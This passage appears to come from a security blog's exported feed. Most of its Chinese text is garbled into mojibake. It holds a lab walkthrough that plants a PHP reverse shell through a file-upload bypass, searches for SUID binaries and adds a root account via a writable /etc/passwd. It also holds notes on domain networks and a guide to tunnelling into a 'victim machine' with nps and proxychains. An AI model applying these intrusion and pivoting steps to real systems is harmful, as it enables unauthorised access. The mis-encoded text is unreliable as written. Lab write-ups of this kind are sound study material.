(VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure><p>å¤§è‡´ä¸Šå¼€å¯äº† <code>80(http)</code> <code>2121(ftp)</code> ç«¯å£</p><h2 id="80ç«¯å£"><a href="#80ç«¯å£" class="headerlink" title="80ç«¯å£"></a>80ç«¯å£</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p><p>ç‚¹å‡»<code>pictures</code></p><p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p><p>ä»¥ä¸ºæ˜¯<code>sqlæ³¨å…¥</code>ç»“æœæ‰‹åŠ¨å°è¯•ï¼Œå¹¶ä¸”<code>sqlmap</code>ä¹Ÿæµ‹è¯•äº†ï¼Œå¹¶æ²¡æœ‰æ³¨å…¥</p><p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p><h3 id="å¦è¾Ÿè¹Šå¾„"><a href="#å¦è¾Ÿè¹Šå¾„" class="headerlink" title="å¦è¾Ÿè¹Šå¾„"></a>å¦è¾Ÿè¹Šå¾„</h3><p>ä½¿ç”¨<code>dirb</code> å·¥å…·æ‰«æç½‘ç«™ç›®å½•</p><p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p><p>æ‰¾åˆ°äº†è¿™ä¸ªç›®å½•ï¼Œè®¿é—®ä¹‹åæ˜¯æ–‡ä»¶ä¸Šä¼ </p><p>ç”±äºæ²¡æœ‰æ£€æŸ¥æ–‡ä»¶åç¼€åï¼Œä½¿ç”¨<code>burpsuite</code>æŠ“åŒ…ç»•è¿‡æ£€æµ‹ï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶ï¼Œä¸€ä¸ª<code>php_reverse_shell</code></p><p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p><p>é€šè¿‡ç›®å½•æ‰«æçš„ç»“æœå¯ä»¥å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„<code>http://192.168.6.129/gallery/original/ </code></p><p>è®¿é—®ä¹‹åå¾—åˆ°shell</p><p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥æ‰¾èƒ½ææƒçš„ä¸œè¥¿ï¼Œæ‰¾<code>setuid</code>æƒé™çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°phpæ–‡ä»¶ï¼Œä»¥ä¸ºæ˜¯ç”¨phpææƒï¼Œç»“æœå‘ç°å¹¶ä¸æ˜¯</p><p>ä¹‹å‰æœ‰è¿‡ä½¿ç”¨<code>exim4</code>ææƒçš„ç»éªŒï¼Œæ‰€ä»¥å°è¯•<code>exim</code>ææƒï¼Œç»“æœä¹Ÿä¸æ˜¯</p><p>æ— å¥ˆå·å·çœ‹ä¸€çœ¼å‚è€ƒç­”æ¡ˆï¼Œå‘ç°<code>/etc/passwd</code>å±…ç„¶å¯å†™ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p><p>ä½¿ç”¨<code>openssl passwd -1 -salt stderr 1234</code>ç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œå†™å…¥ä¸€ä¸ªè´¦æˆ·å³å¯</p><p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p><p>ç„¶ååˆ‡æ¢ç”¨æˆ·ï¼Œå¾—åˆ°<code>root</code>æƒé™</p><p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p><p>è¿™æ¬¡çš„å›¾ä¸æ˜¯å¾ˆå¥½çœ‹ï¼ˆ</p><p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> file-upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘åŸºç¡€çŸ¥è¯†</title>
      <link href="/net_base_1.html"/>
      <url>/net_base_1.html</url>
      
        <content type="html"><![CDATA[<p><code>ã€Šå†…ç½‘å®‰å…¨æ”»é˜²ã€‹</code>è¯»ä¹¦ç¬”è®°</p><p><code>1.1 å†…ç½‘åŸºç¡€çŸ¥è¯†</code></p><a id="more"></a><h1 id="å†…ç½‘åŸºç¡€çŸ¥è¯†"><a href="#å†…ç½‘åŸºç¡€çŸ¥è¯†" class="headerlink" title="å†…ç½‘åŸºç¡€çŸ¥è¯†"></a>å†…ç½‘åŸºç¡€çŸ¥è¯†</h1><h2 id="å·¥ä½œç»„-work-group"><a href="#å·¥ä½œç»„-work-group" class="headerlink" title="å·¥ä½œç»„(work group)"></a>å·¥ä½œç»„(work group)</h2><h3 id="å·¥ä½œç»„ç®€ä»‹"><a href="#å·¥ä½œç»„ç®€ä»‹" class="headerlink" title="å·¥ä½œç»„ç®€ä»‹"></a>å·¥ä½œç»„ç®€ä»‹</h3><p>åœ¨å±€åŸŸç½‘ä¸­é€šè¿‡å·¥ä½œç»„çš„æ–¹å¼è¿›è¡Œèµ„æºç®¡ç†ï¼Œæ˜¯å¯¹å†…ç½‘èµ„äº§çš„åˆ†ç±»å­˜æ”¾ï¼Œä¾¿äºè®¿é—®èµ„æº</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4.png"></p><p>åœ¨å·¥ä½œç»„é‡Œï¼Œæ‰€æœ‰çš„è®¡ç®—æœºéƒ½æ˜¯<strong>å¯¹ç­‰</strong>çš„åœ°ä½ï¼Œæ²¡æœ‰æœåŠ¡å™¨å’Œå®¢æˆ·æœºçš„åŒºåˆ«ã€‚</p><h3 id="åŠ å…¥å·¥ä½œç»„çš„æ–¹æ³•"><a href="#åŠ å…¥å·¥ä½œç»„çš„æ–¹æ³•" class="headerlink" title="åŠ å…¥å·¥ä½œç»„çš„æ–¹æ³•"></a>åŠ å…¥å·¥ä½œç»„çš„æ–¹æ³•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘çš„ç”µè„‘ -&gt; å±æ€§ -&gt; æ›´æ”¹è®¾ç½® -&gt; æ›´æ”¹ -&gt; ï¼ˆæ›´æ”¹è®¡ç®—æœºåå’Œå·¥ä½œç»„ï¼‰ -&gt; é‡å¯</span><br></pre></td></tr></table></figure><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><p>ç¼ºä¹<strong>é›†ä¸­ç®¡ç†ä¸æ§åˆ¶çš„æœºåˆ¶</strong>ï¼Œæ²¡æœ‰é›†ä¸­çš„ç»Ÿä¸€è´¦æˆ·ç®¡ç†ï¼Œæ²¡æœ‰å¯¹èµ„æºå®æ–½æ›´åŠ é«˜æ•ˆç‡çš„é›†ä¸­ç®¡ç†ï¼Œæ²¡æœ‰å®æ–½å·¥ä½œç«™çš„æœ‰æ•ˆé…ç½®å’Œå®‰å…¨æ€§çš„ä¸¥å¯†æ§åˆ¶ã€‚åªé€‚åˆ<strong>å°è§„æ¨¡</strong>çš„ç”¨æˆ·ä½¿ç”¨ã€‚</p><h2 id="åŸŸï¼ˆDomainï¼‰"><a href="#åŸŸï¼ˆDomainï¼‰" class="headerlink" title="åŸŸï¼ˆDomainï¼‰"></a>åŸŸï¼ˆDomainï¼‰</h2><h3 id="åŸŸä»‹ç»"><a href="#åŸŸä»‹ç»" class="headerlink" title="åŸŸä»‹ç»"></a>åŸŸä»‹ç»</h3><p>åŸŸæ˜¯ä¸€ä¸ªæœ‰<strong>å®‰å…¨è¾¹ç•Œ</strong>çš„è®¡ç®—æœºçš„é›†åˆï¼Œæ¯”å·¥ä½œç»„æœ‰æ›´åŠ ä¸¥æ ¼çš„å®‰å…¨ç®¡ç†æ§åˆ¶æœºåˆ¶ï¼Œè®¿é—®åŸŸä¸­çš„èµ„æºå¿…é¡»ä»¥ä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·ç™»å½•åˆ°åŸŸä¸­ï¼Œæƒé™å–å†³äºèº«ä»½ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/timg?image&quality=80&size=b9999_10000&sec=1599556535041&di=bd5e7d530cdd628340d13493a79b2b13&imgtype=0&src=http%253A%252F%252Fpic4.zhimg.com%252Fv2-aaf3546c6df8d197100bf1dd5d8fc6c3_b.jpg" alt="img"></p><blockquote><p>å®‰å…¨è¾¹ç•Œï¼šåœ¨ä¸¤ä¸ªåŸŸä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·ä¸èƒ½è®¿é—®åˆ°å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æº</p></blockquote><h3 id="åŸŸæ§åˆ¶å™¨ï¼ˆDomain-Controllerï¼‰"><a href="#åŸŸæ§åˆ¶å™¨ï¼ˆDomain-Controllerï¼‰" class="headerlink" title="åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰"></a>åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰</h3><p>ç±»ä¼¼é—¨ç¦ç³»ç»Ÿï¼Œæ§åˆ¶åŸŸå†…çš„<strong>èº«ä»½éªŒè¯</strong></p><p>æ˜¯æ•´ä¸ªåŸŸçš„<strong>é€šä¿¡æ¢çº½</strong>ï¼Œæ‰€æœ‰çš„æƒé™èº«ä»½è®¤è¯éƒ½åœ¨åŸŸæ§ä¸Šè¿›è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´<strong>æ‰€æœ‰çš„ç”¨æˆ·åå’Œå¯†ç çš„hashå€¼éƒ½å­˜æ”¾åœ¨åŸŸæ§ä¸Š</strong></p><h3 id="åŸŸç¯å¢ƒ"><a href="#åŸŸç¯å¢ƒ" class="headerlink" title="åŸŸç¯å¢ƒ"></a>åŸŸç¯å¢ƒ</h3><h4 id="å•åŸŸ"><a href="#å•åŸŸ" class="headerlink" title="å•åŸŸ"></a>å•åŸŸ</h4><p>ä¸ºäº†é¿å…DCç˜«ç—ªæ—¶ï¼Œæ•´ä¸ªåŸŸå†…å…¶ä»–ç”¨æˆ·æ— æ³•æ­£å¸¸ç™»å½•ï¼Œä¿è¯åŸŸçš„æ­£å¸¸ä½¿ç”¨ï¼ŒåŸŸå†…è‡³å°‘æœ‰ä¸¤å°åŸŸæœåŠ¡å™¨ï¼Œä¸€å°ä½œä¸º<code>DC</code>ï¼Œå¦ä¸€å°ä½œä¸º<code>å¤‡ç”¨DC</code></p><h4 id="çˆ¶åŸŸå’Œå­åŸŸ"><a href="#çˆ¶åŸŸå’Œå­åŸŸ" class="headerlink" title="çˆ¶åŸŸå’Œå­åŸŸ"></a>çˆ¶åŸŸå’Œå­åŸŸ</h4><p>å¦‚æœæ‰€æœ‰çš„éƒ¨é—¨éƒ½æ”¾åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œä¿¡æ¯äº¤äº’æ‰€èŠ±è´¹çš„æ—¶é—´ä¼šæ¯”è¾ƒé•¿ï¼ŒèŠ±è´¹çš„ä»£ä»·å¤§ã€‚</p><p>é‡‡ç”¨<code>çˆ¶åŸŸå’Œå­åŸŸ</code>ï¼Œå°†æ¯ä¸ªéƒ¨é—¨/åˆ†å…¬å¸ æ”¾å…¥ä¸€ä¸ªå­åŸŸä¸­ï¼Œè®©å­å…¬å¸é€šè¿‡è‡ªå·±çš„åŸŸæ¥ç®¡ç†è‡ªå·±çš„èµ„æº</p><blockquote><p>çˆ¶åŸŸåˆ›å»ºçš„åŸŸç®¡ç†å‘˜ç™»å½•ä¸äº†å­åŸŸçš„æœåŠ¡å™¨ï¼Œå­åŸŸåˆ›å»ºçš„åŸŸç®¡ç†å‘˜ç™»å½•ä¸äº†çˆ¶åŸŸæœåŠ¡å™¨ã€‚</p><p>å› ä¸ºåˆ›å»ºçš„åŸŸç®¡ç†å‘˜å¹¶ä¸åœ¨å¯¹æ–¹çš„æ•°æ®åº“é‡Œé¢ã€‚</p><p>çˆ¶åŸŸçš„æœ¬åœ°ç®¡ç†å‘˜å¯ä»¥ç™»å½•åˆ°å­åŸŸæœåŠ¡å™¨</p></blockquote><h4 id="åŸŸæ ‘"><a href="#åŸŸæ ‘" class="headerlink" title="åŸŸæ ‘"></a>åŸŸæ ‘</h4><p>åŸŸæ ‘æ˜¯å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸçš„å†…éƒ¨ï¼Œä¸èƒ½è®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸã€‚å¦‚æœæƒ³è¦ä¸¤ä¸ªåŸŸä¹‹é—´äº’ç›¸è®¿é—®ï¼Œåˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ã€‚</p><blockquote><p>è¿™äº›ä¿¡ä»»å…³ç³»è”åˆèµ·æ¥å½¢æˆä¸€æ£µæ ‘</p></blockquote><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121161917242-744398688.png" alt="img"></p><p>åœ¨åŸŸæ ‘ä¸­ï¼Œçˆ¶åŸŸå¯ä»¥åŒ…å«å¤šä¸ªå­åŸŸã€‚å­åŸŸæ˜¯ç›¸å¯¹äºçˆ¶åŸŸæ¥è¯´çš„ï¼ŒæŒ‡çš„æ˜¯åŸŸåä¸­çš„ä¸€ä¸ªæ®µã€‚ä¸€ä¸ª<code>.</code>è¡¨ç¤ºä¸€ä¸ªå±‚æ¬¡ã€‚</p><h4 id="åŸŸæ£®æ—"><a href="#åŸŸæ£®æ—" class="headerlink" title="åŸŸæ£®æ—"></a>åŸŸæ£®æ—</h4><p>æ˜¯å¤šæ£µåŸŸæ ‘å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚</p><p>å¯ä»¥é€šè¿‡åŸŸæ ‘ä¹‹é—´å»ºç«‹çš„ä¿¡ä»»å…³ç³»æ¥ç®¡ç†å’Œä½¿ç”¨æ•´ä¸ªæ£®æ—çš„èµ„æºï¼Œä»è€Œåˆä¿æŒäº†åŸæœ‰åŸŸçš„ç‰¹æ€§</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4-20200908145126473.png"></p><h4 id="åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰"><a href="#åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰" class="headerlink" title="åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰"></a>åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰</h4><p>å®ç°<code>åŸŸå</code>å’Œ<code>ipåœ°å€</code>äº’ç›¸è½¬æ¢çš„æœåŠ¡å™¨</p><p><strong>DNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨é€šå¸¸é…ç½®åœ¨åŒä¸€å°æœºå™¨ä¸Š</strong></p><h4 id="æ´»åŠ¨ç›®å½•ï¼ˆActive-Directoryï¼‰"><a href="#æ´»åŠ¨ç›®å½•ï¼ˆActive-Directoryï¼‰" class="headerlink" title="æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰"></a>æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰</h4><p>åŸŸç¯å¢ƒä¸­æä¾›<strong>ç›®å½•æœåŠ¡çš„ç»„ä»¶</strong></p><p>åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•</p><ul><li>è´¦å·é›†ä¸­ç®¡ç†</li><li>è½¯ä»¶é›†ä¸­ç®¡ç†</li><li>ç¯å¢ƒé›†ä¸­ç®¡ç†</li><li>å¢å¼ºå®‰å…¨æ€§</li><li>æ›´å¯é </li></ul><h4 id="å®‰å…¨åŸŸ"><a href="#å®‰å…¨åŸŸ" class="headerlink" title="å®‰å…¨åŸŸ"></a>å®‰å…¨åŸŸ</h4><p>å°†å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µï¼Œè¿™äº›ç½‘æ®µçš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121163434689-855209408.png" alt="img"></p><p>åˆ’åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼š</p><ul><li>å®‰å…¨çº§åˆ«æœ€é«˜çš„**<code>å†…ç½‘</code>**<ul><li>å¯ä»¥åˆ†ä¸º<strong>åŠå…¬åŒº</strong>å’Œ<strong>æ ¸å¿ƒåŒº</strong></li></ul></li><li>å®‰å…¨çº§åˆ«ä¸­ç­‰çš„**<code>DMZ</code>**<ul><li>DMZæ—¶å¯¹å¤–æä¾›æœåŠ¡çš„åŒºåŸŸï¼Œå› æ­¤å¯ä»¥ä»å¤–éƒ¨è®¿é—®ã€‚</li></ul></li><li>å®‰å…¨çº§åˆ«æœ€ä½çš„**<code>å¤–ç½‘</code>**</li></ul><h4 id="è®¿é—®æ§åˆ¶ç­–ç•¥"><a href="#è®¿é—®æ§åˆ¶ç­–ç•¥" class="headerlink" title="è®¿é—®æ§åˆ¶ç­–ç•¥"></a>è®¿é—®æ§åˆ¶ç­–ç•¥</h4><ul><li>  å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘ã€‚é˜²ç«å¢™éœ€è¦æ‰§è¡Œ<code>NAT</code></li><li>  å†…ç½‘å¯ä»¥è®¿é—®<code>DMZ</code></li><li>  å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘ã€‚é™¤éé€šè¿‡<code>VPN</code>æ¥å…¥</li><li>  å¤–ç½‘å¯ä»¥è®¿é—®<code>DMZ</code>ï¼Œå› ä¸º<code>DMZ</code>ä¸­çš„æœåŠ¡å™¨éœ€è¦å¯¹å¤–æœåŠ¡</li><li>  <code>DMZ</code>ä¸èƒ½è®¿é—®å†…ç½‘ï¼Œå¦åˆ™ä¸€æ—¦<strong>DMZæ²¦é™·</strong>ï¼Œå†…ç½‘æ— æ³•å—åˆ°ä¿æŠ¤</li><li>  <code>DMZ</code>ä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œå¦‚æœé…ç½®äº†é‚®ä»¶æœåŠ¡å™¨ï¼Œé‚£å¯ä»¥è®¿é—®ã€‚</li></ul><h3 id="åŸŸå†…æƒé™"><a href="#åŸŸå†…æƒé™" class="headerlink" title="åŸŸå†…æƒé™"></a>åŸŸå†…æƒé™</h3><p>åŸŸå†…è®¾ç½®äº†å¤šä¸ª<strong>å®‰å…¨ç»„</strong>ï¼ŒåŸŸç®¡ç†å‘˜å°†å„ä¸ªæˆå‘˜è´¦æˆ·æ”¾å…¥ç›¸åº”çš„å®‰å…¨ç»„ä¸­ï¼Œå¹¶ä¸ºå®‰å…¨ç»„é…ç½®è®¿é—®æƒé™ï¼Œå°±ç›¸å½“äºä¸ºå®‰å…¨ç»„å†…æ‰€æœ‰çš„è´¦æˆ·åˆ†é…äº†æƒé™ã€‚ç®€åŒ–äº†åŸŸç®¡ç†å‘˜çš„å·¥ä½œã€‚</p><h4 id="åŸŸæœ¬åœ°ç»„"><a href="#åŸŸæœ¬åœ°ç»„" class="headerlink" title="åŸŸæœ¬åœ°ç»„"></a>åŸŸæœ¬åœ°ç»„</h4><p>ä¸»è¦ç”¨æˆ·æˆäºˆæœ¬åŸŸå†…çš„èµ„æºè®¿é—®æƒé™</p><h4 id="å…¨å±€ç»„"><a href="#å…¨å±€ç»„" class="headerlink" title="å…¨å±€ç»„"></a>å…¨å±€ç»„</h4>]]></content>
      
      
      <categories>
          
          <category> intranet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> intranet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨nps</title>
      <link href="/nps.html"/>
      <url>/nps.html</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨<code>nps</code>å·¥å…·è¿›è¡Œå†…ç½‘æ¸—é€</p><a id="more"></a><h2 id="npsä¸‹è½½"><a href="#npsä¸‹è½½" class="headerlink" title="npsä¸‹è½½"></a>npsä¸‹è½½</h2><p><a href="https://github.com/ehang-io/nps">githubæ–‡æ¡£</a></p><p><a href="https://github.com/ehang-io/nps/releases">github release</a></p><p>æ ¹æ®è‡ªå·±çš„ç¯å¢ƒä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œä½¿ç”¨<code>linux_amd64_client</code>å’Œ<code>linux_amd64_server</code>åšä¾‹å­</p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><h3 id="å®‰è£…å·¥å…·"><a href="#å®‰è£…å·¥å…·" class="headerlink" title="å®‰è£…å·¥å…·"></a>å®‰è£…å·¥å…·</h3><p>å°†<code>linux_amd64_server.tar.gz</code>ä¸Šä¼ è‡³å…¬ç½‘æœº(<code>vps</code>)ï¼Œ</p><p>ä½¿ç”¨<code>tar -xvf linux_amd64_server.tar.gz</code>è§£å‹ï¼Œè§£å‹åæ–‡ä»¶å¦‚ä¸‹</p><img src="nps/image-20200819150524939.png" alt="image-20200819150524939" style="zoom:50%;" /><p>è¿è¡Œ<code>./nps install</code>å‘½ä»¤ï¼Œå®‰è£…å·¥å…·</p><img src="nps/image-20200819151325928.png" alt="image-20200819151325928" style="zoom:50%;" /><p>éœ€è¦ï¼ˆè‡³å°‘ï¼‰å¼€å¯è¿™å‡ ä¸ªç«¯å£</p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p><font color=red>ä¸€å®šè¦æ”¹å¯†ç </font></p><p>å®‰è£…å®Œæˆä¹‹åæ‰“å¼€é…ç½®æ–‡ä»¶</p><p><code>vim /etc/nps/conf/nps.conf</code></p><img src="nps/image-20200819150819441.png" alt="image-20200819150819441" style="zoom:50%;" /><p>å…¶ä¸­</p><ul><li><code>web_username</code>æ˜¯webç«¯ç™»å½•çš„ç”¨æˆ·åï¼Œåœ¨ä¹‹åä¼šç”¨åˆ°</li><li><code>web_password</code>æ˜¯webç«¯ç™»å½•çš„å¯†ç </li><li><code>web_port</code>æ˜¯webæœåŠ¡è¿è¡Œçš„ç«¯å£å·</li></ul><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>è®¿é—®<code>ip:web_port</code>è¿›å…¥webç«¯</p><img src="nps/image-20200819151101879.png" alt="image-20200819151101879" style="zoom:50%;" /><p>è¾“å…¥æ­£ç¡®çš„<code>username</code>å’Œ<code>password</code>ä¹‹åè¿›å…¥ç•Œé¢</p><h3 id="æ–°å»ºå®¢æˆ·ç«¯"><a href="#æ–°å»ºå®¢æˆ·ç«¯" class="headerlink" title="æ–°å»ºå®¢æˆ·ç«¯"></a>æ–°å»ºå®¢æˆ·ç«¯</h3><p>é€‰æ‹©**<code>å®¢æˆ·ç«¯</code> -&gt; <code>æ–°å»º</code>**</p><img src="nps/image-20200819151436822.png" alt="image-20200819151436822" style="zoom:50%;" /><ul><li><code>å¤‡æ³¨</code>ï¼šå†™ç»™è‡ªå·±çœ‹çš„æ³¨é‡Šï¼ˆ</li><li><code>è®¤è¯ç”¨æˆ·åã€å¯†ç </code>ï¼šæ”»å‡»æœºä½¿ç”¨è¿™ä¸ªç”¨æˆ·åã€å¯†ç æ¥å…¥npsæœåŠ¡ç«¯ï¼Œé€šè¿‡éš§é“å’Œå—å®³æœºç›¸è¿</li></ul><h3 id="æ–°å»ºéš§é“"><a href="#æ–°å»ºéš§é“" class="headerlink" title="æ–°å»ºéš§é“"></a>æ–°å»ºéš§é“</h3><p>æ–°å»ºå®Œå®¢æˆ·ç«¯ä¹‹åç‚¹å‡»<code>éš§é“</code></p><img src="nps/image-20200819152251731.png" alt="image-20200819152251731" style="zoom:50%;" /><p><code>æ–°å»º</code></p><img src="nps/image-20200819152339494.png" alt="image-20200819152339494" style="zoom:50%;" /><h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>åœ¨æ–°å»ºå®Œå®¢æˆ·ç«¯ä¹‹å</p><img src="nps/image-20200819151745081.png" alt="image-20200819151745081" style="zoom:50%;" /><p>ç‚¹å‡»**<code>+</code>**</p><img src="nps/image-20200819151827068.png" alt="image-20200819151827068" style="zoom:50%;" /><p>å¾—åˆ°è¿™ä¸€ä¸²æŒ‡ä»¤</p><p>å°†<code>linux_amd64_client.tar.gz</code>è§£å‹ï¼Œå¾—åˆ°ä¸€ä¸ª<code>npc</code></p><p>å°†npcä¸Šä¼ è‡³å—å®³æœº</p><p><code>chmod +x npc</code>ç»™äºˆè¿è¡Œæƒé™ï¼Œç„¶åè¿è¡Œä¸Šé¢æœåŠ¡ç«¯ç»™å‡ºçš„æŒ‡ä»¤</p><p>æœåŠ¡ç«¯åˆ·æ–°ä¹‹åå¯ä»¥çœ‹åˆ°çŠ¶æ€å˜ä¸º<code>åœ¨çº¿</code></p><img src="nps/image-20200819152123248.png" alt="image-20200819152123248" style="zoom:50%;" /><h2 id="æ”»å‡»æœºè¿æ¥"><a href="#æ”»å‡»æœºè¿æ¥" class="headerlink" title="æ”»å‡»æœºè¿æ¥"></a>æ”»å‡»æœºè¿æ¥</h2><p>è¿™é‡Œä½¿ç”¨<code>kali linux</code>ç¤ºä¾‹</p><p>ç¼–è¾‘<code>/etc/proxychain.conf</code>æ–‡ä»¶ï¼Œæ³¨é‡Šæ‰æœ€åä¸€å¥</p><img src="nps/image-20200819152536104.png" alt="image-20200819152536104" style="zoom:50%;" /><p>æ·»åŠ ä¸€å¥<code>socks5 ip port username password</code></p><p>å…¶ä¸­ï¼Œ<code>username</code> å’Œ <code>password</code> æ˜¯æ–°å»ºå®¢æˆ·ç«¯çš„æ—¶å€™ä½¿ç”¨çš„é‚£ä¸ª</p><p>è¿æ¥ä¸Šå»ä¹‹åä½¿ç”¨</p><p><code>proxychains</code> + <code>[shell](ä¾‹å¦‚ nmap 172.12.0.3)</code></p><p>è¿™é‡Œä¸¾ä¾‹ä¸€ä¸ª</p><p><code>proxychains firefox</code></p><img src="nps/image-20200819155154169.png" alt="image-20200819155154169" style="zoom:50%;" /><p>å¯ä»¥è®¿é—®åˆ°</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jacobi_flyå¤©ç¿¼æ¯2020WP</title>
      <link href="/Jacobi_fly.html"/>
      <url>/Jacobi_fly.html</url>
      
